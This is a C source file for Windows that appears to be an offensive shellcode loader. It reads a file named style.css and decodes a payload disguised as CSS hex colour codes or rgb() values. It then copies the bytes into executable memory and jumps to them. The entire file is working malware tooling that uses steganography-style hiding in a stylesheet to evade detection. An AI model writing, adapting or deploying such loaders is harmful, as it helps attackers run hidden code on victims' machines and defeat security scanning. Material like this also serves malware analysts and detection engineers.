#include <Windows.h>
#include <stdio.h>

#define STYLEFILE "..\\..\\style.css"

BOOL DecodeCssHex(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
    BYTE * payload = NULL;
    SIZE_T payloadSize = 0;

    payload = (BYTE *) VirtualAlloc(NULL, (cssFileSize/2), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!payload) {
        printf("[!] Error calling VirtualAlloc[2]: %d\n", GetLastError());
        return FALSE;
    }

    while(*cssFile++) {
        if (strncmp(cssFile, "#", 1) == 0) {
            BYTE * hexValueStart = cssFile + 1;
            
            for (int i = 0; i < 3; i++) {
                BYTE hexPair[3];
                hexPair[0] = hexValueStart[i * 2];
                hexPair[1] = hexValueStart[i * 2 + 1];
                hexPair[2] = '\0';
            
                payload[payloadSize++] = (BYTE) strtol(hexPair, NULL, 16);
            }
        }
    }

    *decPayload = payload;
    *decPayloadSize = payloadSize;

    return TRUE;
}

BOOL DecodeCssRbg(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
    BYTE * payload = NULL;
    SIZE_T payloadSize = 0;

    payload = (BYTE *) VirtualAlloc(NULL, (cssFileSize/2), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!payload) {
        printf("[!] Error calling VirtualAlloc[2]: %d\n", GetLastError());
        return FALSE;
    }

    while(*cssFile++) {
        if (strncmp(cssFile, "rgb", 3) == 0) {
            // Find length of rgb values inside parentheses
            BYTE rgbValueStr[12] = { 0 };
            int counter = 0;
            BYTE * rgbValueStart = cssFile + 4;

            while(1) {
                if (*(rgbValueStart + counter) == ')') {
                    break;
                } else {
                    counter++;
                }
            }

            strncpy(rgbValueStr, rgbValueStart, counter);

            DWORD firstVal = strtol(strtok(rgbValueStr, " "), NULL, 10);
            DWORD secondVal = strtol(strtok(NULL, " "), NULL, 10);
            DWORD thirdVal = strtol(strtok(NULL, " "), NULL, 10);
            BYTE valStr[3] = { (BYTE) firstVal, (BYTE) secondVal, (BYTE) thirdVal };

            for (int i = 0; i < 3; i++) {
                payload[payloadSize++] = valStr[i];
            }
        }
    }

    *decPayload = payload;
    *decPayloadSize = payloadSize;

    return TRUE;
}

int main(void) {
    HANDLE hFile = NULL;
    BYTE * decodedPayload = NULL;
    BYTE * encodedPayloadBuf = NULL;
    LARGE_INTEGER fileSize = { 0 };
    DWORD bytesRead = NULL;
    SIZE_T decodedPayloadSize = 0;
    DWORD oldProt = NULL;

    hFile = CreateFileA(STYLEFILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
        goto _EndOfFunc;
	}

    if (GetFileSizeEx(hFile, &fileSize) == 0) {
        printf("[!] Error calling GetFileSizeEx: %d\n", GetLastError());
        goto _EndOfFunc;
    }

    encodedPayloadBuf = (BYTE *) VirtualAlloc(NULL, fileSize.LowPart, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!encodedPayloadBuf) {
        printf("[!] Error calling VirtualAlloc: %d\n", GetLastError());
        goto _EndOfFunc;
    }

    if (!ReadFile(hFile, encodedPayloadBuf, fileSize.LowPart, &bytesRead, NULL)) {
        printf("[!] Error calling ReadFile: %d\n", GetLastError());
        goto _EndOfFunc;
    }


    // Uncomment and comment below to use Hex version    
    // if (!DecodeCssHex(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
    //     printf("[!] Error decoding CSS payload\n");
    //     goto _EndOfFunc;
    // }


    // Uncomment and comment above to use Hex version
    if (!DecodeCssRbg(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
        printf("[!] Error decoding CSS payload\n");
        goto _EndOfFunc;
    }

    (*(VOID(*)()) decodedPayload)();

_EndOfFunc:
    if (hFile) CloseHandle(hFile);
    if (encodedPayloadBuf) VirtualFree(encodedPayloadBuf, fileSize.LowPart, MEM_RELEASE);
    if (decodedPayload) VirtualFree(decodedPayload, fileSize.LowPart, MEM_RELEASE);

    return 0;
}
